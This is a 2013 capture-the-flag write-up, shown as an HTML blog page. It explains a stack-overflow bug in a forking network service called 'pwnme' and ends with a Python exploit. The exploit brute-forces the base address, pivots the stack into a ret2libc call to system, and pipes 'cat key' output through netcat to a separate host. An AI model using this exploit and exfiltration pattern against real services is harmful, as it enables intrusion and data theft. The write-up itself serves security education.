@@ -1,0 +1,297 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>secuinside CTF 2013 quals pwnme writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="PIE is turned on when compilling pwnme. Position-Independent-Executable is a feature of GCC that allows the executable to behave like a shared &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/secuinside-ctf-2013-quals-pwnme-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Secuinside CTF 2013 Quals Pwnme Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-07T00:00:00+08:00" pubdate data-updated="true">Jun 7<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>PIE is turned on when compilling pwnme. Position-Independent-Executable is a feature of GCC that allows the executable to behave like a shared library so base addresses can be relocatable.</p>
+
+<p>The major part of the source of pwnme is as below:</p>
+
+<pre><code>#define MYPORT 8181 
+#define BUFSIZE 1024 
+
+void main(void)
+{
+    char buf[BUFSIZE];
+    ……    
+    if (!fork()) { 
+        send(client_fd, "what is your name? ", 19, 0);
+
+        memset(buf, 0, sizeof(buf));
+        recv(client_fd, buf, BUFSIZE+16, 0);
+        send(client_fd, "nice to meet you!\n", 18, 0);
+
+        printf("DEBUG : %s was here\n", buf);
+        memset(buf, 0, sizeof(buf));
+        close(client_fd);
+        return 0;
+    } else {
+        close(client_fd);  
+        while(waitpid(-1, NULL, WNOHANG) &gt; 0); 
+    }
+}
+</code></pre>
+
+<p>Obviously, it contains a basic stack overflow bug and we can only overwrite return address of <code>main</code> function. What&#8217;s worse, the first BUFSIZE bytes of buffer is set to 0 before return of <code>main</code>. However, a call of <code>printf</code> moves the input buffer to the stdout buffer. We can use a <code>leave ret</code> gadget to migrate the stack to the stdout buffer. So suppose we know base address, we can figure out the address of stdout buffer and perform a ret2libc attack using <code>system</code> function.</p>
+
+<p>Pwnme forks a child process for each connection, so the base address will be the same with the parent process. Luckily, randomization on x86 Ubuntu is only 9-bits. We can perform a brute-force attack on the base address.</p>
+
+<p>Our exploit code is as follows:</p>
+
+<pre><code>import sys
+import struct
+import socket
+
+HOST = "54.214.258.68"
+HOST = "172.16.0.142"
+PORT = 8181
+
+def p(addr):
+    return struct.pack("&lt;I", addr)
+
+def exploit(base, host, port):
+    print hex(base)
+    leaveret = p(base + 0xe2953)
+    ret = p(base + 0xe2954)
+    ebp = p(base + 0x1b7034)
+    cmd = '(ls;pwd;cat key) | nc 172.16.0.1 12345'
+    cmd_addr = p(base + 0x1b738d)
+    system = p(base + 0x41280)
+    buf = 180 * ret + system + "AAAA" + cmd_addr + ' ' * (1040 - 180 * 4 - 12 - 1 - 40 - 8 - len(cmd)) + cmd + ';' + 'B' * 40 + ebp + leaveret
+
+    try :
+        s = socket.socket()
+        s.connect((host, port))
+        s.settimeout(3)
+        s.recv(1024)
+        s.send(buf)
+        s.close()
+        return True
+    except socket.error:
+        print "socket error!"
+        return False
+    else:
+        sys.exit(1)
+
+# base = 0xb7e23000
+# exploit(base, HOST, PORT)
+
+bases = range(0xb7500000, 0xb76ff000, 0x1000)
+i = 0
+while i &lt; len(bases):
+    if exploit(bases[i], HOST, PORT):
+        i += 1
+</code></pre>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">kelwin</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-07T00:00:00+08:00" pubdate data-updated="true">Jun 7<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/uncategorized/'>Uncategorized</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/secuinside-ctf-2013-quals-pwnme-writeup/" data-via="" data-counturl="http://www.blue-lotus.net/www/secuinside-ctf-2013-quals-pwnme-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/secuinside-ctf-quals-2013-127-0-0-1-writeup/" title="Previous Post: secuinside CTF Quals 2013 127.0.0.1 writeup">&laquo; secuinside CTF Quals 2013 127.0.0.1 writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/ebctf-2013-pwn-300-snake-writeup/" title="Next Post: ebctf 2013 pwn 300 snake writeup">ebctf 2013 pwn 300 snake writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
